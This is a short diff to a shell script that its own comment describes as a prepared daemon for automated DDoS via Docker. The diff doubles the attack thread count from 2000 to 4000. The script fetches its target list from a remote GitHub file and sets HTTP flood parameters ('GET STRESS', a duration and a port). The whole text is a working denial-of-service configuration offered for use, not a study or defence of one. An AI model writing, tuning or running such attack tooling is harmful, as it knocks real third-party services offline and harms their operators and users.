@@ -2,7 +2,7 @@
 #Prepared script for use as a system deamon in unix-based systems for automated ddos via docker
 
 duration="10m"
-threads_count="-t 2000"
+threads_count="-t 4000"
 targets_source="-c https://raw.githubusercontent.com/uawarrior/project1/main/trgts0.txt"
 more_params="-p 900 --debug --http-methods GET STRESS"
 
